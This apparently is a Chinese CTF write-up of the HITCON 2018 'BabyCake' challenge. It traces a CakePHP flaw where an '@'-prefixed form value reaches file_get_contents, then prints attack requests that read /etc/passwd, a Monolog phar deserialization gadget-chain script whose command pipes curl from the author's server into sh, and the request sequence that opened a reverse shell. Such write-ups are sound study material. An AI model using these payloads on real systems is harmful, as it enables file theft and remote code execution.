---
title: hitcon2018受虐笔记三:BabyCake学习
url: 731.html
id: 731
categories:
  - hack_ctf
date: 2018-10-26 00:04:48
tags:
  - hitcon2018 
  - ctf
---



代码审计能力真是太太差了，下载下来一看20多M，当时就有点懵，最后连题目的业务逻辑处理过程都没有理解清楚....

拿到writeup之后，又自己分析了一遍，过程记录如下：

首先看到composer.json文件，知道代码使用了cakephp框架。

然后找源码的controller，主要业务逻辑的代码如下：

<!--more-->

```php
/*
 filename : /src/Controller/PagesController.php
*/ 
<?php

namespace App\Controller;
use Cake\Core\Configure;
use Cake\Http\Client;
use Cake\Http\Exception\ForbiddenException;
use Cake\Http\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;

class DymmyResponse {
    function __construct($headers, $body) {
        $this->headers = $headers;
        $this->body = $body;
    }
}

class PagesController extends AppController {

    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers,
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }

    private function back() {
        return $this->render('pages');
    }

    private function _cache_dir($key){
        $ip = $this->request->getEnv('REMOTE_ADDR');
        $index = sprintf('mycache/%s/%s/', $ip, $key);
        return CACHE . $index;
    }

    private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");

            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }

    public function display(...$path) {
        $request  = $this->request;
        $data = $request->getQuery('data');
        $url  = $request->getQuery('url');
        if (strlen($url) == 0)
            return $this->back();

        $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) );
        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
            return $this->back();

        $method = strtolower($request->getMethod() );
        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();

        $headers = [];
        foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;
            $headers[$key] = $value[0];
        }

        $key = md5($url);
        if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
        }

        foreach ($response->headers as $key => $value) {
            if (strtolower($key) == 'content-type') {
                $this->response->type(array('type' => $value));
                $this->response->type('type');
                continue;
            }
            $this->response->withHeader($key, $value);
        }

        $this->response->body($response->body);
        return $this->response;
    }
}
```

程序主要会接收用户提交的两个参数data和url：

```php
$data = $request->getQuery('data');
$url  = $request->getQuery('url');
```

然后获取用户的请求方式，支持`['get', 'post', 'put', 'delete', 'patch']`，然后利用同样的请求方式去请求url参数的地址，同时携带上data参数的内容，和用户的header。url支持的协议只有http和https：

```php
if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();
 $headers = [];
 foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;
            $headers[$key] = $value[0];
        }
if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
  }
```

但这里面对GET请求是单独处理的，因为对GET请求做了一个cache：

```php
private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");

            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }
```

跟一下如果不是GET请求，之后的代码：

```php
    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }
```

跟踪一下POST请求的处理过程：

```php
/*
filename: ./vendor/cakephp/cakephp/src/Http/Client.php
*/
public function post($url, $data = [], array $options = [])
{
        $options = $this->_mergeOptions($options);
        $url = $this->buildUrl($url, [], $options);

        return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
}
```

调用了_doRequest方法，跟一下：

```php
    protected function _doRequest($method, $url, $data, $options)
    {
        $request = $this->_createRequest(
            $method,
            $url,
            $data,
            $options
        );

        return $this->send($request, $options);
    }
```

继续跟踪_createRequest方法：

```php
protected function _createRequest($method, $url, $data, $options)
{
        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
        if (isset($options['type'])) {
            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
        }
        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        $request = new Request($url, $method, $headers, $data);
        $cookies = isset($options['cookies']) ? $options['cookies'] : [];
        /** @var \Cake\Http\Client\Request $request */
        $request = $this->_cookies->addToRequest($request, $cookies);
        if (isset($options['auth'])) {
            $request = $this->_addAuthentication($request, $options);
        }
        if (isset($options['proxy'])) {
            $request = $this->_addProxy($request, $options);
        }

        return $request;
}
```

继续跟踪`$request = new Request($url, $method, $headers, $data);`,

```php
/*
filename:./vendor/cakephp/cakephp/src/Http/Client/Request.php
*/
// 看Request 类的构造函数：
    public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
    {
        $this->validateMethod($method);
        $this->method = $method;
        $this->uri = $this->createUri($url);
        $headers += [
            'Connection' => 'close',
            'User-Agent' => 'CakePHP'
        ];
        $this->addHeaders($headers);
        $this->body($data);
    }

//看一下body方法
    public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();

            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;
        return $this;
    }
```

如果`$data`是一个数组，就会调用

```php
$formData = new FormData();
$formData->addMany($body);
$this->header('Content-Type', $formData->contentType());
$body = (string)$formData;
```

跟踪一下`FromData`类的`addMany`函数

```php
public function addMany(array $data)
{
        foreach ($data as $name => $value) {
            $this->add($name, $value);
        }

        return $this;
}
    public function add($name, $value = null)
    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }

        return $this;
    }
```

如果`$value`是用@开头的，则调用`addFile`方法:

```php
public function addFile($name, $value)
    {
        $this->_hasFile = true;

        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);

        return $part;
    }
```

如果value不是resource，就会带入file_get_contents中处理，也就是说可以控制file_get_contents的参数，造成一个任意文件读取：

```
http http://13.230.134.135/\?url\=http://wonderkun.cc:8888/\&data\[x\]\=@/etc/passwd 1=1
```

在服务器端就可以收到/etc/passwd的内容。

因为可以完全控制file_get_contents的参数，所以可以利用 `phar://` 协议触发反序列化，进而 getshell。大致思路如下：

1.构造相应的 payload
2.将相应的 payload 放入某个 phar 文件中，并放到我们的服务器上
3.通过题目提供的功能访问我们服务器上的 phar 文件，此时相应文件被写入缓存中，具体路径为 `/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/xxz.phar)/body.cache`
4.通过 `post` 请求 `phar://` 协议的反序列化进而触发我们的 payload

看到vender中monolog，可以利用这个来构造执行链。

[https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php)

```php
<?php

namespace Monolog\Handler
{
    class SyslogUdpHandler
    {
        protected $socket;
        function __construct($x)
        {
            $this->socket = $x;
        }
    }
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;
        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }
}

namespace{
    $cmd = "curl http://wonderkun.cc:3000/wonderkun.cc:888|sh";

    $obj = new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', 'system'],
            [$cmd, 'level' => null]
        )
    );

    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($obj);
    $phar->stopBuffering();
}
```

讲生成`exploit.phar`放到`wonderkun.cc/exploit.phar`,然后依次访问

```bash
http http://13.230.134.135/?url=http://wonderkun.cc/exploit.phar
http http://13.230.134.135/\?url\=http://www.wonderkun.cc/index.html/\&data\[x\]\=@phar:///var/www/html/tmp/cache/mycache/x.x.x.x/6a2d709b1f3953e11d7cbfd14b322af4/body.cache 1=1
```

就成功的反弹了shell。
